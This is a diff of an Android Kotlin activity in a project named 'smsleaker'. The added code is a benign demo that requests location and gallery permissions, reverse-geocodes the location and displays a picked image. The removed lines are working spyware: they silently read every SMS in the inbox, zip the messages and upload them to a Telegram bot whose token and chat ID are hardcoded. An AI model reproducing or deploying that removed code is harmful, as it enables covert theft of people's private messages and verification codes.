@@ -1,122 +1,199 @@
 package com.example.smsleaker
 
-import android.Manifest
-//noinspection SuspiciousImport
+import android.annotation.SuppressLint
+import android.app.Activity
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.location.Address
+import android.location.Geocoder
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
-import android.os.Environment
-import android.provider.Settings
+import android.provider.MediaStore
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
-import com.github.kittinunf.fuel.core.FileDataPart
-import com.github.kittinunf.fuel.httpUpload
-import java.io.BufferedOutputStream
-import java.io.File
-import java.io.FileOutputStream
-import java.util.zip.ZipEntry
-import java.util.zip.ZipOutputStream
+import com.example.smsleaker.databinding.ActivityMainBinding
+import com.google.android.gms.location.FusedLocationProviderClient
+import com.google.android.gms.location.LocationServices
+import java.util.Locale
 
 class MainActivity : AppCompatActivity() {
-
-    private val SMS_PERMISSION_CODE = 1001
-    private val MANAGE_STORAGE_PERMISSION_CODE = 1002
+    private var _binding: ActivityMainBinding? = null
+    private val binding get() = _binding!!
+    private lateinit var fusedLocationClient: FusedLocationProviderClient
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
+        _binding = ActivityMainBinding.inflate(layoutInflater)
+        setContentView(binding.root)
 
-        // Check for storage permission for Android 11 and above
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
-            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
-            intent.data = Uri.parse("package:$packageName")
-            startActivityForResult(intent, MANAGE_STORAGE_PERMISSION_CODE)
-        } else {
-            requestSmsPermission()
+        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
+
+        binding.getImage.setOnClickListener {
+            checkGalleryPermission()
+        }
+
+        binding.getLocation.setOnClickListener {
+            checkLocationPermission()
+        }
+
+        binding.getLocation.setOnLongClickListener {
+            getUserLocation()
+            true
+        }
+
+        binding.getImage.setOnLongClickListener {
+            openGallery()
+            true
         }
     }
 
-    private fun requestSmsPermission() {
+
+    // Request location permissions
+    private fun checkLocationPermission() {
         if (ContextCompat.checkSelfPermission(
-                this, Manifest.permission.READ_SMS
+                this,
+                android.Manifest.permission.ACCESS_FINE_LOCATION
+            ) != PackageManager.PERMISSION_GRANTED
+            || ContextCompat.checkSelfPermission(
+                this,
+                android.Manifest.permission.ACCESS_COARSE_LOCATION
             ) != PackageManager.PERMISSION_GRANTED
         ) {
             ActivityCompat.requestPermissions(
-                this, arrayOf(Manifest.permission.READ_SMS), SMS_PERMISSION_CODE
+                this,
+                arrayOf(
+                    android.Manifest.permission.ACCESS_FINE_LOCATION,
+                    android.Manifest.permission.ACCESS_COARSE_LOCATION
+                ),
+                LOCATION_PERMISSION_REQUEST_CODE
             )
         } else {
-            processSmsAndSendToTelegram()
+            Toast.makeText(this, "Location permission already granted", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    // Request gallery read permissions
+    private fun checkGalleryPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(
+                    this,
+                    android.Manifest.permission.READ_MEDIA_IMAGES
+                ) != PackageManager.PERMISSION_GRANTED
+            ) {
+                ActivityCompat.requestPermissions(
+                    this,
+                    arrayOf(android.Manifest.permission.READ_MEDIA_IMAGES),
+                    GALLERY_PERMISSION_REQUEST_CODE
+                )
+            } else {
+                Toast.makeText(this, "Gallery permission already granted", Toast.LENGTH_SHORT).show()
+            }
+        } else {
+            if (ContextCompat.checkSelfPermission(
+                    this,
+                    android.Manifest.permission.READ_EXTERNAL_STORAGE
+                ) != PackageManager.PERMISSION_GRANTED
+            ) {
+                ActivityCompat.requestPermissions(
+                    this,
+                    arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE),
+                    GALLERY_PERMISSION_REQUEST_CODE
+                )
+            } else {
+                Toast.makeText(this, "Gallery permission already granted", Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+
+    // Get user's location and perform reverse geocoding
+    @SuppressLint("MissingPermission")
+    private fun getUserLocation() {
+        fusedLocationClient.lastLocation.addOnSuccessListener { location ->
+            if (location != null) {
+                val latitude = location.latitude
+                val longitude = location.longitude
+                getAddressFromLocation(latitude, longitude)
+            } else {
+                Toast.makeText(this, "Location not available", Toast.LENGTH_SHORT).show()
+            }
+        }
+    }
+
+    // Reverse geocoding to get the location name
+    @SuppressLint("SetTextI18n")
+    private fun getAddressFromLocation(latitude: Double, longitude: Double) {
+        val geocoder = Geocoder(this, Locale.getDefault())
+        try {
+            val addresses: MutableList<Address>? = geocoder.getFromLocation(latitude, longitude, 1)
+            if (addresses!!.isNotEmpty()) {
+                val address: Address = addresses[0]
+                val addressString = address.getAddressLine(0) // Full address
+                binding.myLocation.text = "${address.countryName} ${address.featureName}"
+                Toast.makeText(this, "Location: $addressString", Toast.LENGTH_LONG).show()
+            } else {
+                Toast.makeText(this, "Address not found", Toast.LENGTH_SHORT).show()
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+            Toast.makeText(this, "Error retrieving address", Toast.LENGTH_SHORT).show()
         }
     }
 
     override fun onRequestPermissionsResult(
-        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == SMS_PERMISSION_CODE && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-            processSmsAndSendToTelegram()
-        } else {
-            Toast.makeText(this, "Permission Denied", Toast.LENGTH_SHORT).show()
-        }
-    }
-
-    private fun processSmsAndSendToTelegram() {
-        val smsList = getAllSms()
-        if (smsList.isNotEmpty()) {
-            val zipFile = createZipFile(smsList)
-            sendToTelegram(zipFile)
-        } else {
-//            Toast.makeText(this, "No SMS found", Toast.LENGTH_SHORT).show()
-        }
-    }
-
-    private fun getAllSms(): List<String> {
-        val smsList = mutableListOf<String>()
-        val uri = Uri.parse("content://sms/inbox")
-        val cursor = contentResolver.query(uri, null, null, null, null)
-
-        cursor?.use {
-            val indexBody = it.getColumnIndex("body")
-            val indexAddress = it.getColumnIndex("address")
-            while (it.moveToNext()) {
-                val smsBody = it.getString(indexBody)
-                val smsAddress = it.getString(indexAddress)
-                smsList.add("From: $smsAddress\nMessage: $smsBody")
+        when (requestCode) {
+            LOCATION_PERMISSION_REQUEST_CODE -> {
+                if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
+                    Toast.makeText(this, "Location permission granted", Toast.LENGTH_SHORT).show()
+                } else {
+                    Toast.makeText(this, "Location permission denied", Toast.LENGTH_SHORT).show()
+                }
+            }
+            GALLERY_PERMISSION_REQUEST_CODE -> {
+                if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
+                    Toast.makeText(this, "Gallery permission granted", Toast.LENGTH_SHORT).show()
+                } else {
+                    Toast.makeText(this, "Gallery permission denied", Toast.LENGTH_SHORT).show()
+                }
             }
         }
-
-        return smsList
     }
 
-    private fun createZipFile(smsList: List<String>): File {
-        val fileName = "sms_backup.zip"
-        val file = File(getExternalFilesDir(null), fileName)
+    // Открываем галерею при долгом нажатии
+    private fun openGallery() {
+        val intent = Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+        startActivityForResult(intent, GALLERY_REQUEST_CODE)
+    }
 
-        ZipOutputStream(BufferedOutputStream(FileOutputStream(file))).use { zipOut ->
-            smsList.forEachIndexed { index, sms ->
-                val entry = ZipEntry("sms_$index.txt")
-                zipOut.putNextEntry(entry)
-                zipOut.write(sms.toByteArray())
-                zipOut.closeEntry()
+    // Обрабатываем результат выбора изображения
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == GALLERY_REQUEST_CODE && resultCode == Activity.RESULT_OK && data != null) {
+            val selectedImageUri: Uri? = data.data
+            if (selectedImageUri != null) {
+                binding.myImage.setImageURI(selectedImageUri)
+            } else {
+                Toast.makeText(this, "Не удалось загрузить изображение", Toast.LENGTH_SHORT).show()
             }
         }
-
-        return file
     }
 
-    private fun sendToTelegram(file: File) {
-        val botToken = "6845327291:AAFaQMOFii44XYjqqjY7PsqapKgp564YQOE"
-        val chatId = "5510162499"
-        val telegramApiUrl = "https://api.telegram.org/bot$botToken/sendDocument"
+    companion object {
+        private const val LOCATION_PERMISSION_REQUEST_CODE = 100
+        private const val GALLERY_PERMISSION_REQUEST_CODE = 101
+        private const val GALLERY_REQUEST_CODE = 123
+    }
 
-        telegramApiUrl.httpUpload(parameters = listOf("chat_id" to chatId))
-            .add { FileDataPart(file, name = "document") }.response { _, _, result ->
-                result.fold(success = { data -> println("Success: $data") },
-                    failure = { error -> println("Error: ${error.message}") })
-            }
+    override fun onDestroy() {
+        super.onDestroy()
+        _binding = null
     }
 }
+
